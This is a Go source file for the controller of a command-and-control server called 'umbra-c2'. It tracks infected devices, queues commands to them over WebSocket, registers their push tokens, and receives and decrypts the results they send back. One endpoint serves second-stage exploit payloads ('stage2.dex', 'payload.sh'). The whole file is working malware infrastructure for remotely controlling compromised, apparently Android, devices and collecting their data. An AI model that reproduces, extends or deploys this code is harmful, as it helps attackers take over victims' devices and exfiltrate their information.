package c2

import (
	"encoding/json"
	"net/http"
	"path/filepath"
	"time"

	"umbra-c2/app/umbra-c2/internal/model"
	"umbra-c2/app/umbra-c2/internal/service"

	"github.com/gogf/gf/v2/frame/g"
	"github.com/gogf/gf/v2/net/ghttp"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// Controller holds C2 HTTP handlers.
type Controller struct{}

// New creates a new C2 controller.
func New() *Controller {
	return &Controller{}
}

// Health handles GET /api/health
func (c *Controller) Health(r *ghttp.Request) {
	total, online := service.Registry.Count()
	r.Response.WriteJson(model.HealthResponse{
		Status:      "ok",
		DeviceCount: total,
		OnlineCount: online,
		Uptime:      service.Registry.Uptime().String(),
	})
}

// ListDevices handles GET /api/devices
func (c *Controller) ListDevices(r *ghttp.Request) {
	devices := service.Registry.List()
	if devices == nil {
		devices = make([]model.DashboardDevice, 0)
	}
	r.Response.WriteJson(g.Map{
		"devices": devices,
		"count":   len(devices),
	})
}

// QueueCommand handles POST /api/command
func (c *Controller) QueueCommand(r *ghttp.Request) {
	var req model.CommandRequest
	if err := r.Parse(&req); err != nil {
		r.Response.WriteJson(g.Map{"error": err.Error()})
		return
	}

	if req.DeviceID == "" || req.Module == "" || req.Action == "" {
		r.Response.WriteJson(g.Map{"error": "device_id, module, and action are required"})
		return
	}

	cmd := model.Command{
		ID:       uuid.New().String(),
		DeviceID: req.DeviceID,
		Module:   req.Module,
		Action:   req.Action,
		Params:   req.Params,
		Time:     time.Now(),
	}

	g.Log().Infof(r.Context(), "Command queued: %s -> %s/%s [%s]",
		cmd.DeviceID, cmd.Module, cmd.Action, cmd.ID)

	// Try to push via WebSocket; falls back to queue if device not connected
	go service.PushCommandToDevice(r.Context(), cmd)

	r.Response.WriteJson(g.Map{
		"command_id": cmd.ID,
		"status":     "queued",
	})
}

// ReceiveResult handles POST /api/result (HTTP fallback)
func (c *Controller) ReceiveResult(r *ghttp.Request) {
	var req model.ResultRequest
	if err := r.Parse(&req); err != nil {
		r.Response.WriteJson(g.Map{"error": err.Error()})
		return
	}

	// Decrypt
	decrypted := ""
	if req.Data != "" {
		plain, err := service.Decrypt(req.Data)
		if err != nil {
			g.Log().Warningf(r.Context(), "Result decrypt failed from %s: %v", req.DeviceID, err)
			decrypted = req.Data
		} else {
			decrypted = plain
		}
	}

	g.Log().Infof(r.Context(), "=== RESULT (HTTP) from %s [cmd=%s] ===\n%s\n================================",
		req.DeviceID, req.CommandID, decrypted)

	service.Registry.MarkSeen(req.DeviceID)

	// Broadcast to dashboard
	result := model.DashboardResult{
		DeviceID:  req.DeviceID,
		CommandID: req.CommandID,
		Data:      decrypted,
		Time:      time.Now().Format(time.RFC3339),
	}
	service.Broadcaster.Broadcast(result)

	r.Response.WriteJson(g.Map{"status": "received"})
}

// RegisterFCM handles POST /api/register-fcm
func (c *Controller) RegisterFCM(r *ghttp.Request) {
	var req model.FCMRegisterRequest
	if err := r.Parse(&req); err != nil {
		r.Response.WriteJson(g.Map{"error": err.Error()})
		return
	}

	if req.DeviceID == "" || req.Token == "" {
		r.Response.WriteJson(g.Map{"error": "device_id and token are required"})
		return
	}

	service.Registry.SetFCMToken(req.DeviceID, req.Token)
	g.Log().Infof(r.Context(), "FCM token registered for device %s", req.DeviceID)
	r.Response.WriteJson(g.Map{"status": "ok"})
}

// ServeStage2 handles GET /api/stage2 — serves native exploit payloads.
// Query param `file` selects which payload (default: stage2.dex).
// Available: stage2.dex, payload.sh
func (c *Controller) ServeStage2(r *ghttp.Request) {
	filename := r.Get("file").String()
	if filename == "" {
		filename = "stage2.dex"
	}
	// Sanitize to prevent path traversal
	safe := filepath.Base(filename)
	r.Response.ServeFile("resource/stage2/" + safe)
}

// SSEEvents handles GET /api/events (Server-Sent Events for dashboard)
func (c *Controller) SSEEvents(r *ghttp.Request) {
	r.Response.Header().Set("Content-Type", "text/event-stream")
	r.Response.Header().Set("Cache-Control", "no-cache")
	r.Response.Header().Set("Connection", "keep-alive")
	r.Response.Header().Set("Access-Control-Allow-Origin", "*")

	ch := service.Broadcaster.Subscribe()
	defer service.Broadcaster.Unsubscribe(ch)

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case result, ok := <-ch:
			if !ok {
				return
			}
			data, _ := json.Marshal(result)
			r.Response.Writefln("data: %s\n", data)
			r.Response.Flush()
		}
	}
}

// WebSocketHandler handles GET /c2 (WebSocket upgrade)
func (c *Controller) WebSocketHandler(r *ghttp.Request) {
	conn, err := upgrader.Upgrade(r.Response.Writer, r.Request, nil)
	if err != nil {
		g.Log().Errorf(r.Context(), "WebSocket upgrade failed: %v", err)
		return
	}
	service.HandleWebSocket(r.Context(), conn)
}
